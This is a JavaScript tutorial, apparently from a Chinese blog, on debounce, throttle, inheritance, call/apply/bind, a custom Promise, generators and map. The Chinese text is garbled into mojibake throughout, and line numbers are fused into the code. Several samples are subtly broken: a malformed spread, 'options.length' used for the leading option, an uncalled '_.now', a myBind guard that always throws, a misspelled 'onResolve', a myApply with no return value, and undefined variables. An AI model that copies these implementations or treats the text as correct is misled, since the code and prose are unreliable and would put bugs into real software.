function(..args)&#123; if (timer) clearTimeout(timer); timer = setTimeout(()=&gt;&#123; func.apply(this,args); &#125;,wait); &#125;&#125;// ä¸éš¾çœ‹å‡ºæ¥å¦‚æžœç”¨æˆ·è°ƒç”¨è¯¥å‡½æ•°é—´éš”å°äºŽ wait çš„æƒ…å†µä¸‹ï¼Œä¸Šä¸€æ¬¡æ—¶é—´è¿˜æœªåˆ°å°±è¢«æ¸…é™¤äº†ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œå‡½æ•°ã€‚ è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é˜²æŠ–ï¼Œä½†æ˜¯æœ‰ç¼ºé™·ï¼Œåœ¨äºŽå®ƒåªèƒ½æœ€åŽè°ƒç”¨ã€‚ä¸€èˆ¬çš„é˜²æŠ–ä¼šæœ‰ immediate é€‰é¡¹ï¼Œè¡¨ç¤ºæ˜¯å¦ç«‹å³è°ƒç”¨ã€‚è¿™ä¸¤è€…çš„åŒºåˆ«ï¼š ä¾‹å¦‚åœ¨æœç´¢å¼•æ“Žæœç´¢é—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬å½“ç„¶å¸Œæœ›ç”¨æˆ·è¾“å…¥å®Œæœ€åŽä¸€ä¸ªå­—æ‰è°ƒç”¨æŸ¥è¯¢æŽ¥å£ï¼Œè¿™ä¸ªæ—¶å€™ç”¨ å»¶è¿Ÿæ‰§è¡Œ çš„é˜²æŠ–å‡½æ•°ï¼Œå®ƒæ€»æ˜¯åœ¨ä¸€è¿žä¸²ï¼ˆé—´éš”å°äºŽ waitï¼‰å‡½æ•°è§¦å‘ä¹‹åŽè°ƒç”¨ ä¾‹å¦‚ç”¨æˆ·ç»™é¡¹ç›®ç‚¹ star çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›ç”¨æˆ·ç‚¹ç¬¬ä¸€ä¸‹çš„æ—¶å€™å°±åŽ»è°ƒç”¨æŽ¥å£ï¼Œå¹¶æˆåŠŸä¹‹åŽæ”¹å˜ star æŒ‰é’®çš„æ ·å­ï¼Œç”¨æˆ·å°±å¯ä»¥ç«‹é©¬å¾—åˆ°åé¦ˆæ˜¯å¦ star æˆåŠŸäº†ï¼Œè¿™ä¸ªæƒ…å†µä½¿ç”¨ ç«‹å³è°ƒç”¨çš„é˜²æŠ–å‡½æ•°ï¼Œå®ƒæ€»åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå¹¶ä¸”ä¸‹ä¸€æ¬¡è°ƒç”¨å¿…é¡»å’Œå‰ä¸€æ¬¡è°ƒç”¨çš„æ—¶é—´é—´éš”å¤§äºŽ wait æ‰ä¼šè§¦å‘ã€‚ å¸¦æœ‰ç«‹å³æ‰§è¡Œçš„é˜²æŠ–å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344// è¿™ä¸ªç”¨æ¥èŽ·å–å½“å‰æ—¶é—´æˆ³function now()&#123; return +new Date();&#125;/*** é˜²æŠ–å‡½æ•°ï¼Œè¿”å›žå‡½æ•°è¿žç»­è°ƒç”¨ï¼Œç©ºé—²æ—¶é—´å¿…é¡»å¤§äºŽæˆ–è€…ç­‰äºŽ wait,func æ‰ä¼šæ‰§è¡Œ* @param &#123;function&#125; func å›žè°ƒå‡½æ•°* @param &#123;number&#125; wait è¡¨ç¤ºçª—å£çš„é—´éš”* @param &#123;boolean&#125; immediate è®¾ç½®ä¸º trueæ—¶ï¼Œæ˜¯å¦ç«‹å³è°ƒç”¨å‡½æ•°* @return &#123;function&#125; */function debounce(func,wait=50,immediate=true)&#123; let timer,context,args; // å»¶è¿Ÿæ‰§è¡Œå‡½æ•° const later = () =&gt; setTimeout(()=&gt;&#123; // å»¶è¿Ÿæ‰§è¡Œå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œæ¸…é™¤ç¼“å­˜çš„å®šæ—¶å™¨åºå· timer = null; // å»¶è¿Ÿæ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œå‡½æ•°ä¼šåœ¨å»¶æ—¶å‡½æ•°ä¸­æ‰§è¡Œï¼Œä½¿ç”¨åˆ°ä¹‹å‰ç¼“å­˜çš„å‚æ•°å’Œä¸Šä¸‹æ–‡ if(!immediate)&#123; func.apply(context,args); context = args = null &#125; &#125;,wait) // è¿™é‡Œè¿”å›žçš„å‡½æ•°æ˜¯æ¯æ¬¡å®žé™…è°ƒç”¨çš„å‡½æ•° return function(...params)&#123; // å¦‚æžœæ²¡æœ‰åˆ›å»ºæ ·å¼æ‰§è¡Œå‡½æ•°ï¼ˆlaterï¼‰,é‚£å°±åˆ›å»ºä¸€ä¸ª if(!timer)&#123; timer = later(); // å¦‚æžœæ˜¯ç«‹å³æ‰§è¡Œï¼Œè°ƒç”¨å‡½æ•°ï¼Œå¦åˆ™ç¼“å­˜å‚æ•°å’Œè°ƒç”¨ä¸Šä¸‹æ–‡ if(immediate)&#123; func.apply(this,params); &#125;else&#123; context = this; args = params &#125; // å¦‚æžœå·²æœ‰å»¶è¿Ÿæ‰§è¡Œå‡½æ•°ï¼ˆlaterï¼‰ ï¼Œè°ƒç”¨çš„æ—¶å€™æ¸…é™¤åŽŸæ¥çš„å¹¶é‡æ–°è®¾å®šä¸€ä¸ª // è¿™æ ·åšå»¶è¿Ÿå‡½æ•°ä¼šé‡æ–°è®¡æ—¶ &#125;else&#123; clearTimeout(timer); timer = later(); &#125; &#125;&#125;; æ€»ç»“ä¸€ä¸‹ï¼š å¯¹äºŽæŒ‰é’®ç‚¹å‡»æ¥è¯´çš„å®žçŽ°:å¦‚æžœå‡½æ•°æ˜¯ç«‹å³æ‰§è¡Œçš„ï¼Œå°±ç†è§£è°ƒç”¨ï¼Œå¦‚æžœå‡½æ•°æ˜¯å»¶è¿Ÿæ‰§è¡Œçš„ï¼Œå°±ç¼“å­˜ä¸Šä¸‹æ–‡å’Œå‚æ•°ï¼Œæ”¾åˆ°å»¶è¿Ÿå‡½æ•°ä¸­æ‰§è¡Œï¼Œä¸€æ—¦å¼€å§‹ä¸€ä¸ªå®šæ—¶å™¨ï¼Œåªè¦å®šæ—¶å™¨è¿˜åœ¨ï¼Œæ¯æ¬¡ç‚¹å‡»éƒ½ä¼šé‡æ–°è®¡æ—¶ã€‚ä¸€æ—¦å®šæ—¶å™¨æ—¶é—´åˆ°äº†ï¼Œå®šæ—¶å™¨é‡ç½®ä¸ºnull,å°±å¯ä»¥å†æ¬¡ç‚¹å‡»äº†ã€‚ å¯¹äºŽå»¶è¿Ÿå‡½æ•°æ¥è¯´çš„å®žçŽ°ï¼šæ¸…é™¤å®šæ—¶å™¨IDï¼Œå¦‚æžœæ˜¯å»¶è¿Ÿè°ƒç”¨å°±è°ƒç”¨å‡½æ•° èŠ‚æµé˜²æŠ–å’ŒèŠ‚æµæœ¬è´¨ä¸Šæ˜¯ä¸ä¸€æ ·çš„ã€‚é˜²æŠ–æ˜¯å°†å¤šæ¬¡æ‰§è¡Œå˜æˆæœ€åŽä¸€æ¬¡æ‰§è¡Œï¼ŒèŠ‚æµæ˜¯å°†å¤šæ¬¡æ‰§è¡Œå˜æˆæ¯éš”ä¸€æ®µæ—¶é—´æ‰§è¡Œã€‚ é€šä¿—åŒ–ï¼šå¦‚æžœå°†æ°´é¾™å¤´æ‹§ç´§ç›´åˆ°æ°´æ˜¯ä»¥æ°´æ»´çš„å½¢å¼æµå‡ºï¼Œé‚£ä¹ˆä½ ä¼šå‘çŽ°éš”ä¸€æ®µæ—¶é—´ï¼Œå°±ä¼šæœ‰ä¸€æ»´æ°´æºœå‡ºæ¥ã€‚ä¹Ÿå°±æ˜¯ä¼šé¢„å…ˆè®¾å®šä¸€ä¸ªæ‰§è¡Œå‘¨æœŸï¼Œå½“è°ƒç”¨åŠ¨ä½œçš„æ—¶åˆ»å¤§äºŽç­‰äºŽæ‰§è¡Œå‘¨æœŸåˆ™æ‰§è¡Œè¯¥åŠ¨ä½œï¼Œç„¶åŽè¿›å…¥ä¸‹ä¸€ä¸ªå‘¨æœŸ è¢–çç‰ˆå®žçŽ°ï¼š 12345678910const throttle = (wait,func)=&gt;&#123; let last = 0; return function(...args)&#123; const curr = +new Date(); if(curr - last &gt; wait)&#123; func.apply(this,args); last = curr; &#125; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/*** underscore èŠ‚æµå‡½æ•°ï¼Œè¿”å›žå‡½æ•°è¿žç»­è°ƒç”¨ï¼Œfunc æ‰§è¡Œé¢‘çŽ‡æ˜¯ æ¬¡/wait* @param &#123;function&#125; func å›žè°ƒå‡½æ•°* @param &#123;number&#125; wait è¡¨ç¤ºçª—å£çš„é—´éš”* @param &#123;object&#125; options å¦‚æžœæƒ³å¿½ç•¥å¼€å§‹å‡½æ•°çš„è°ƒç”¨ï¼Œä¼ å…¥&#123;leading:false&#125;,å¦‚æžœæƒ³å¿½ç•¥ç»“å°¾å‡½æ•°åˆ™æ˜¯&#123;trailing:false&#125;,ä¸¤è€…ä¸èƒ½å…±å­˜ï¼Œå¦åˆ™å‡½æ•°ä¸æ‰§è¡Œã€‚* @return &#123;function&#125; è¿”å›žå®¢æˆ·è°ƒç”¨çš„å‡½æ•°*/_.throttle = function(func,wait,options)&#123; let context,args,result; let timeout = null; // ä¹‹é—´çš„æ—¶é—´æˆ³ let previous = 0; // å¦‚æžœ options æ²¡ä¼ åˆ™è®¾ç½®ä¸ºç©ºå¯¹è±¡ if(!options) options = &#123;&#125;; // å®šæ—¶å™¨å›žè°ƒå‡½æ•° const later = function()&#123; // å¦‚æžœè®¾ç½®äº† leading,å°±å°† previous è®¾ä¸º0ï¼Œç”¨äºŽä¸‹ä¸€ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ª if åˆ¤æ–­ previous = options.length === false ? 0 : _.now(); // ç½®ç©ºæ˜¯ä¸ºäº†é˜²æ­¢å†…å­˜æ³„éœ²ï¼Œä¹Ÿæ˜¯ä¸ºäº†ä¸‹é¢å®šæ—¶å™¨çš„åˆ¤æ–­ timeout = null; result = func.apply(context,args); if(!timeout) context = args = null; &#125; return function()&#123; // èŽ·å¾—å½“å‰çš„æ—¶é—´æˆ³ const now = _.now; // é¦–å…ˆè¿›å…¥å‰è€…è‚¯å®šè¦ä¸º true,å¦‚æžœéœ€è¦ç¬¬ä¸€æ¬¡ä¸æ‰§è¡Œå‡½æ•°ï¼Œå°±å°†ä¸Šæ¬¡æ—¶é—´æˆ³è®¾å®šä¸ºå½“å‰çš„ï¼Œå°±ä¸‹æ¥çš„è®¡ç®—ä¸­ remaining çš„å€¼æ—¶ä¼šå¤§äºŽ0 if(previous &amp;&amp; options.leading === false) previous = now; // è®¡ç®—å‰©ä¸‹çš„æ—¶é—´ const remaining = wait - (now - previous); context = this; args = arguments; // å¦‚æžœå½“å‰è°ƒç”¨ç»™æ„è§å¤§äºŽä¸Šæ¬¡æ—¶é—´ + waitï¼Œæˆ–è€…ç”¨æˆ·æ‰‹åŠ¨è°ƒäº†äº‹ä»¶ï¼Œå¦‚æžœè®¾ç½® trailingï¼Œåªä¼šè¿›å…¥è¿™ä¸ªæ¡ä»¶ if(remaining &lt;= 0 || remaining &gt; wait)&#123; // å¦‚æžœå­˜åœ¨å®šæ—¶å™¨å°±æ¸…ç†æŽ‰å¦åˆ™ä¼šè°ƒç”¨äºŒæ¬¡å›žè°ƒ if(timeout)&#123; clearTimeout(timeout); timeout = null; &#125; previous = now; result = func.apply(context,args); if(!timeout) context = args = null; &#125;else if(!timeout &amp;&amp;options.trailing !== false)&#123; // åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†å®šæ—¶å™¨å’Œ trailing ï¼Œæ²¡æœ‰çš„è¯å°±å¼€å¯ä¸€ä¸ªå®šæ—¶å™¨ï¼Œå¹¶ä¸”ä¸èƒ½åŒæ—¶è®¾ç½® leading å’Œ trailing timeout = setTimeout(later,remaining); &#125; return result &#125;&#125; ç»§æ‰¿åœ¨ ES5 ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼è§£å†³ç»§æ‰¿çš„é—®é¢˜ 1234567891011121314function Super()&#123;&#125;Super.prototype.getNumber = function()&#123; return 1&#125;function Sub()&#123;&#125;let s = new Sub();Sub.prototype = Object.create(Super.prototype,&#123; constructor:&#123; value:Sub, enumerable:false, writable:true, configurable:true &#125;&#125;); ä¸Šé¢çš„ç»§æ‰¿å®žçŽ°æ€è·¯å°±æ˜¯å°†å­ç±»çš„åŽŸåž‹è®¾ç½®ä¸ºçˆ¶ç±»çš„åŽŸåž‹ åœ¨ ES6 ä¸­ï¼Œå¯ä»¥é€šè¿‡ class è¯­æ³•ç³–è§£å†³è¿™ä¸ªé—®é¢˜ 1234567class MyDate extends Date&#123; test()&#123; return this.getTime(); &#125;&#125;let myDate = new MyDate();myDate.test(); call,apply,bind åŒºåˆ«call å’Œ apply éƒ½æ˜¯ä¸ºäº†è§£å†³æ”¹å˜ this çš„æŒ‡å‘ï¼Œä½œç”¨éƒ½æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯ä¼ å‚çš„æ–¹å¼ä¸åŒï¼Œé™¤äº†ç¬¬ä¸€ä¸ªå‚æ•°å¤–ï¼Œcall å¯ä»¥æŽ¥å—ä¸€ä¸ªå‚æ•°åˆ—è¡¨ï¼Œapply åªæŽ¥å—ä¸€ä¸ªå‚æ•°æ•°ç»„ 12345678910let a =&#123; value:1&#125;function getValue(name,age)&#123; console.log(name); console.log(age); console.log(this.value);&#125;getValue.call(a,'haha','24');getValue.apply(a,['haha','24']); æ¨¡æ‹Ÿå®žçŽ° call å’Œ applyå¯ä»¥ä»Žä¸‹é¢å‡ ç‚¹æ¥è€ƒè™‘å¦‚ä½•å®žçŽ° ä¸ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆé»˜è®¤å¯ä»¥ä¸º window æ”¹å˜äº† this æŒ‡å‘ï¼Œè®©æ–°çš„å¯¹è±¡å¯ä»¥æ‰§è¡Œè¯¥å‡½æ•°ã€‚ 12345678910111213Function.prototype.myCall = function(context)&#123; var context = context || window; // ç»™ context æ·»åŠ ä¸€ä¸ªå±žæ€§ // getValue.call(a,'haha',24) -&gt; a.fn('haha','24'); context.fn = this; // å°† context åŽé¢çš„å‚æ•°å–å‡ºæ¥ var args = [...arguments].slice(1); var result = context.fn(...args); // åˆ é™¤ fn delete context.fn return result&#125; apply çš„å®žçŽ°ä¹Ÿæ˜¯ç±»ä¼¼çš„ 1234567891011Function.prototype.myApply = function(context)&#123; var context = context || window; context.fn = this; var result; // åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚æžœå­˜åœ¨å°±æŠŠç¬¬äºŒä¸ªå‚æ•°å±•å¼€ if(arguments[1])&#123; result = context.fn(...arguments[1]); &#125;else&#123; result = context.fn(); &#125;&#125; bind å’Œå…¶ä»–ä¸¤ä¸ªæ–¹æ³•ä½œç”¨ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è¯¥æ–¹æ³•ä¼šè¿”å›žä¸€ä¸ªå‡½æ•°ã€‚å¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡ bind å®žçŽ°æŸ¯é‡ŒåŒ– æ¨¡æ‹Ÿå®žçŽ° bind 1234567891011121314Function.prototype.myBind = function(context)&#123; if(typeof this !== 'undefined')&#123; throw new TypeError('Error'); &#125; var _this = this; var args = [...arguments].slice(1); // è¿”å›žä¸€ä¸ªå‡½æ•° return function F()&#123; if(this instanceof F)&#123; return new _this(..args,...arguments); &#125; return _this.apply(context,args.concat(...arguments)); &#125;&#125; Promise å®žçŽ°Promise æ˜¯ ES6 æ–°å¢žçš„è¯­æ³•ï¼Œè§£å†³äº†å›žè°ƒåœ°ç‹±çš„é—®é¢˜ã€‚ å¯ä»¥æŠŠ Promise çœ‹æˆä¸€ä¸ªçŠ¶æ€æœºã€‚åˆå§‹çŠ¶æ€æ˜¯ pending çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡å‡½æ•° resolve å’Œ reject ï¼Œå°†çŠ¶æ€è½¬å˜ä¸º resolved å’Œ rejected çŠ¶æ€ï¼ŒçŠ¶æ€ä¸€æ—¦æ”¹å˜å°±ä¸èƒ½å†å‘ç”Ÿå˜åŒ–äº†ã€‚ then å‡½æ•°ä¼šè¿”å›žä¸€ä¸ª Promise å®žä¾‹ï¼Œå¹¶ä¸”è¯¥è¿”å›žå€¼æ˜¯ä¸€ä¸ªæ–°çš„å®žä¾‹è€Œä¸æ˜¯ä¹‹å‰çš„å®žä¾‹ã€‚å› ä¸º Promise è§„èŒƒè§„å®šäº† pending çŠ¶æ€ï¼Œå…¶ä»–çŠ¶æ€æ˜¯ä¸å¯ä»¥æ”¹å˜çš„ï¼Œå¦‚æžœè¿”å›žçš„æ˜¯åŒä¸€ä¸ªå®žä¾‹çš„è¯ï¼Œå¤šä¸ª then è°ƒç”¨å°±å¤±åŽ»æ„ä¹‰äº†ã€‚ å¯¹äºŽ then æ¥è¯´ï¼Œæœ¬è´¨ä¸Šå¯ä»¥æŠŠå®ƒçœ‹æˆ flatMap 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150 const PENDING = 'pending'; const RESOLVED = 'resolved'; const REJECTED = 'rejected'; // promise æŽ¥å—ä¸€ä¸ªå‡½æ•°å‚æ•°ï¼Œè¯¥å‡½æ•°ä¼šç†è§£æ‰§è¡Œ function MyPromise(fn) &#123; let _this = this; _this.currentState = PENDING; _this.value = undefined; // ç”¨äºŽä¿å­˜ then ä¸­çš„å›žè°ƒï¼Œåªæœ‰å½“ promise çŠ¶æ€ä¸º pending æ—¶æ‰ä¼šç¼“å­˜ï¼Œå¹¶ä¸”æ¯ä¸ªå®žä¾‹è‡³å¤šç¼“å­˜ä¸€ä¸ª _this.resolvedCallbacks = []; _this.rejectedCallbacks = []; _this.resolve = function (value) &#123; if (value instanceof MyPromise) &#123; // å¦‚æžœ value æ˜¯ä¸ª Promise ï¼Œé€’å½’æ‰§è¡Œ return value.then(_this.resolve, _this.reject); &#125; setTimeout(() =&gt; &#123; // å¼‚æ­¥æ‰§è¡Œï¼Œä¿è¯æ‰§è¡Œé¡ºåº if (_this.currentState === PENDING) &#123; _this.currentState = RESOLVED; _this.value = value; _this.resolvedCallbacks.forEach(cb =&gt; cb()); &#125; &#125;); &#125; _this.reject = function (reason) &#123; setTimeout(() =&gt; &#123; if (_this.currentState === PENDING) &#123; _this.currentState = REJECTED; _this.value = reason; _this.rejectedCallbacks.forEach(cb =&gt; cb()); &#125; &#125;); &#125; // ç”¨äºŽè§£å†³ä¸‹é¢çš„é—®é¢˜ // new Promise(()=&gt; throw Error('error')) try &#123; fn(_this.resolve, _this.reject) &#125; catch (e) &#123; _this.reject(e) &#125; &#125;// then å‡½æ•°çš„ä½œç”¨æ˜¯ä¸º Promise å®žä¾‹æ·»åŠ çŠ¶æ€æ”¹å˜æ—¶çš„å›žè°ƒå‡½æ•°ã€‚then æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ resolved çŠ¶æ€çš„å›žè°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼ˆå¯é€‰ï¼‰æ˜¯ rejected çŠ¶æ€çš„å›žè°ƒå‡½æ•°ã€‚// then æ–¹æ³•è¿”å›žçš„æ˜¯ä¸€ä¸ªæ–°çš„ promise å®žä¾‹ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨é“¾å¼å†™æ³•ï¼Œå³ then æ–¹æ³•åŽé¢å†è°ƒç”¨å¦ä¸€ä¸ª then æ–¹æ³•ã€‚ MyPromise.prototype.then = function (onResolved, onRejected) &#123; const self = this; // then å¿…é¡»è¿”å›žä¸€ä¸ªæ–°çš„ promise let promise2; // å¦‚æžœ onResolved å’Œ onRejected éƒ½ä¸ºå¯é€‰å‚æ•°ï¼Œå¦‚æžœç±»åž‹ä¸æ˜¯å‡½æ•°éœ€è¦å¿½ç•¥ï¼ŒåŒæ—¶ä¹Ÿå®žçŽ°äº†é€ä¼  // Promise.resolve(4).then().then((value)=&gt;console.log(value)) onResolved = typeof onResolved === 'function' ? onResolved : v =&gt; v; onRejected = typeof onRejected === 'function' ? onRejected : r =&gt; &#123; throw r &#125;; if (self.currentState === RESOLVED) &#123; return (promise2 = new MyPromise(function (resolve, reject) &#123; setTimeout(() =&gt; &#123; try &#123; let x = onResolve(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (reason) &#123; reject(reason) &#125; &#125;); &#125;)) &#125; if (self.currentState === REJECTED) &#123; return (promise2 = new MyPromise(function (resolve, reject) &#123; setTimeout(() =&gt; &#123; try &#123; let x = onRejected(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (reason) &#123; reject(reason) &#125; &#125;); &#125;)) &#125; if (self.currentState === PENDING) &#123; return (promise2 = new MyPromise(function (resolve, reject) &#123; self.rejectedCallbacks.push(function () &#123; try &#123; let x = onRejected(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (r) &#123; reject(r) &#125; &#125;); self.resolvedCallbacks.push(function () &#123; try &#123; let x = onResolved(self.value); resolutionProcedure(promise2, x, resolve, reject) &#125; catch (r) &#123; reject(r) &#125; &#125;); &#125;)) &#125; &#125; function resolutionProcedure(promise2, x, resolve, reject) &#123; // x ä¸èƒ½ä¸Ž promise2 ç›¸åŒï¼Œé¿å…å¾ªçŽ¯ if (promise2 === x) &#123; return reject(new TypeError('Error')); &#125; // å¦‚æžœ x ä¸º Promise ï¼ŒçŠ¶æ€ä¸º pending éœ€è¦ç»§ç»­ç­‰å¾…å¦åˆ™æ‰§è¡Œ if (x instanceof MyPromise) &#123; if (x.currentState === PENDING) &#123; x.then(function (value) &#123; // å†æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ˜¯ä¸ºäº†ç¡®è®¤ x resolve çš„ å‚æ•°æ˜¯ä»€ä¹ˆç±»åž‹ï¼Œå¦‚æžœæ˜¯åŸºæœ¬ç±»åž‹å°±å†æ¬¡ resolveï¼ŒæŠŠå€¼ä¼ ç»™ä¸‹ä¸€ä¸ª then resolutionProcedure(promise2, x, resolve, reject); &#125;, reject); &#125; else &#123; x.then(resolve, reject); &#125; return; &#125; // reject æˆ–è€… resolve å…¶ä¸­ä¸€ä¸ªæ‰§è¡Œå¾—è¿‡çš„è¯ï¼Œå¿½ç•¥å…¶ä»–çš„ let called = false; // åˆ¤æ–­ x æ˜¯å¦ä¸ºå¯¹è±¡æˆ–è€…æ˜¯å‡½æ•° if (x !== null &amp;&amp; (typeof x === 'object' || typeof x === 'function')) &#123; // å¦‚æžœä¸èƒ½å–å‡º then ï¼Œå°± reject try &#123; let then = x.then; if (typeof then === 'function') &#123; then.call( x, y =&gt; &#123; if (called) return; called = true; resolutionProcedure(promise2, y, resolve, reject); &#125;, e =&gt; &#123; if (called) return; called = true; reject(e); &#125;); &#125; else &#123; resolve(x) &#125; &#125; catch (e) &#123; if (called) return; called = true; reject(e) &#125; &#125; else &#123; resolve(x); &#125; &#125; Generator å®žçŽ°Generator æ˜¯ ES6 ä¸­æ–°å¢žçš„è¯­æ³•ï¼Œå’Œ Promise ä¸€æ ·ï¼Œéƒ½å¯ä»¥ç”¨å¼‚æ­¥æ¥ç¼–ç¨‹ã€‚ Generator å‡½æ•°ä¹Ÿå¯ä»¥ç†è§£æˆä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå°è£…äº†å¤šä¸ªå†…éƒ¨çŠ¶æ€ã€‚ æ‰§è¡Œ Generator å‡½æ•°ä¼šè¿”å›žä¸€ä¸ªéåŽ†å™¨å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒGenerator å‡½æ•°é™¤äº†çŠ¶æ€æœºï¼Œè¿˜æ˜¯ä¸€ä¸ªéåŽ†å™¨å¯¹è±¡ç”Ÿæˆå‡½æ•°ã€‚è¿”å›žçš„éåŽ†å™¨å¯¹è±¡ï¼Œå¯ä»¥ä¾æ¬¡éåŽ† Generator å‡½æ•°å†…éƒ¨çš„æ¯ä¸€ä¸ªçŠ¶æ€ã€‚ å½¢å¼ä¸Šï¼ŒGenerator å‡½æ•°æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªç‰¹å¾ã€‚ä¸€ä¸ªæ˜¯ function å…³é”®å­—ä¸Žå‡½æ•°åä¹‹é—´æœ‰ä¸€ä¸ª æ˜Ÿå·ï¼ŒäºŒæ˜¯å‡½æ•°å†…éƒ¨ä½¿ç”¨ yield è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºä¸åŒçš„å†…éƒ¨çŠ¶æ€ã€‚ 123456789101112// ä½¿ç”¨ * è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª Generator å‡½æ•°// å†…éƒ¨å¯ä»¥ä½¿ç”¨ yield æš‚åœä»£ç // è°ƒç”¨ next æ¢å¤æ‰§è¡Œfunction* test()&#123; let a = 1 + 2; yield 2; yield 3; &#125;let b = test();b.next(); // &#123;value:2,done:false&#125;b.next(); // &#123;value:3,done:false&#125;b.next(); // &#123;value:undefined,done:true&#125; ä¸Šè¿°ä»£ç å¯ä»¥å‘çŽ°ï¼ŒåŠ ä¸Š * çš„å‡½æ•°æ‰§è¡ŒåŽæ‹¥æœ‰äº† next å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å‡½æ•°æ‰§è¡ŒåŽè¿”å›žäº†ä¸€ä¸ªå¯¹è±¡ã€‚æ¯æ¬¡è°ƒç”¨ next å‡½æ•°å¯ä»¥ç»§ç»­æ‰§è¡Œè¢«æš‚åœçš„ä»£ç ï¼Œä¸‹é¢æ˜¯ Generator çš„ç®€å•å®žçŽ°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940// cb ä¹Ÿå°±æ˜¯ç¼–è¯‘çš„ test å‡½æ•°function MyGerenator(cb) &#123; return (function () &#123; const object = &#123; next: 0, stop: function () &#123; &#125; &#125;; return &#123; next: function () &#123; const ret = cb(obj); if (ret === undefined) return &#123; value: undefined, done: true &#125; return &#123; value: ret, done: false &#125; &#125; &#125; &#125;)();&#125;// ä½¿ç”¨ babel ç¼–è¯‘åŽå¯ä»¥å‘çŽ° test å‡½æ•°å˜æˆäº†è¿™æ ·function test() &#123; let a; return MyGerenator(function () &#123; while (1) &#123; switch ((_context.prev = _context.next)) &#123; // å¯ä»¥å‘çŽ°é€šè¿‡ yield å°†ä»£ç åˆ†æˆäº†å‡ å—ï¼Œæ¯æ¬¡æ‰§è¡Œ next å‡½æ•°å°±æ‰§è¡Œä¸€å—ä»£ç ï¼Œå¹¶ä¸”è¡¨æ˜Žä¸‹æ¬¡éœ€è¦æ‰§è¡Œå“ªå—ä»£ç  case 0: a = 1 + 2; _context.next = 4; return 2; case 4: _context.next = 6; return 3; case 6: case 'end': return _context.stop(); &#125; &#125; &#125;)&#125; ä¸€é“é¢˜ç›®12345678function *foo(x)&#123; let y = 2 * (yield(x+1)) let z = yield(y/3) return (x+y+z)&#125;console.log(it.next()) // =&gt; &#123;value: 6, done: false&#125;console.log(it.next(12)) // =&gt; &#123;value: 8, done: false&#125;console.log(it.next(13)) // =&gt; &#123;value: 42, done: true&#125; åˆ†æžï¼š é¦–å…ˆ Generator å‡½æ•°è°ƒç”¨å’Œæ™®é€šå‡½æ•°ä¸åŒï¼Œå®ƒä¼šè¿”å›žä¸€ä¸ªè¿­ä»£å™¨ å½“æ‰§è¡Œç¬¬ä¸€æ¬¡ next æ—¶ï¼Œä¼ å‚ä¼šè¢«å¿½ç•¥ï¼Œå¹¶ä¸”å‡½æ•°æš‚åœåœ¨ yield (x + 1) å¤„ï¼Œæ‰€ä»¥è¿”å›ž 5 + 1 = 6 å½“æ‰§è¡Œç¬¬äºŒæ¬¡ next æ—¶ï¼Œä¼ å…¥çš„å‚æ•°ç­‰äºŽä¸Šä¸€ä¸ª yield çš„è¿”å›žå€¼ï¼Œå¦‚æžœä½ ä¸ä¼ å‚ï¼Œyield æ°¸è¿œè¿”å›ž undefinedã€‚æ­¤æ—¶ let y = 2 * 12ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ª yield ç­‰äºŽ 2 * 12 / 3 = 8 å½“æ‰§è¡Œç¬¬ä¸‰æ¬¡ next æ—¶ï¼Œä¼ å…¥çš„å‚æ•°ä¼šä¼ é€’ç»™ zï¼Œæ‰€ä»¥ z = 13, x = 5, y = 24ï¼Œç›¸åŠ ç­‰äºŽ 42 Mapã€FlatMap å’Œ ReduceMap çš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼ŒéåŽ†åŽŸæ•°ç»„ï¼Œå°†æ¯ä¸ªå…ƒç´ æ‹¿å‡ºæ¥ç„¶åŽåšä¸€äº›å˜æ¢ç„¶åŽ append åˆ°æ–°çš„æ•°ç»„ä¸­ 12[1,2,3].map(v=&gt;v+1);// [2,3,4] Map æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯å½“å‰ç´¢å¼•å…ƒç´ ï¼Œç´¢å¼•ï¼ŒåŽŸæ•°ç»„ 1234['1','2','3'].map(parseInt);// parseInt('1',0) -&gt; 1// parseInt('2',1) -&gt; NaN// parseInt('3',2) -&gt; NaN FlatMap å’Œ map çš„ä½œç”¨å‡ 